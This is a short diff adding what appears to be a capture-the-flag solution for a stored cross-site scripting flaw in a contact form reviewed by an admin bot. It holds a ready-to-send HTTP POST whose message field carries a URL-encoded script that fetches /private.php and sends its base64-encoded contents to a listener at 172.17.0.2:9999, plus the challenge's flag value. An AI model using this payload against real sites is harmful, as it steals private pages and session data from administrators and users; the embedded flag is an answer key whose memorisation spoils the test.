@@ -1,0 +1,8 @@
+# Stored XSS via contact form. Admin bot reviews submissions with authenticated session. XSS payload fetches /private.php (which contains the flag) and exfiltrates base64-encoded content to attacker listener at 172.17.0.2:9999. Flag: flag{9adb79f5-0675-4f6b-b2ba-143ab5045c08}
+
+POST /contact.php HTTP/1.1
+Host: 172.17.0.1:46705
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 238
+
+name=xbow&email=attacker%40evil.com&message=%3Cscript%3Efetch%28%27%2Fprivate.php%27%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3E%7Bnew+Image%28%29.src%3D%27http%3A%2F%2F172.17.0.2%3A9999%2F%3Fd%3D%27%2Bbtoa%28t%29%7D%29%3C%2Fscript%3E
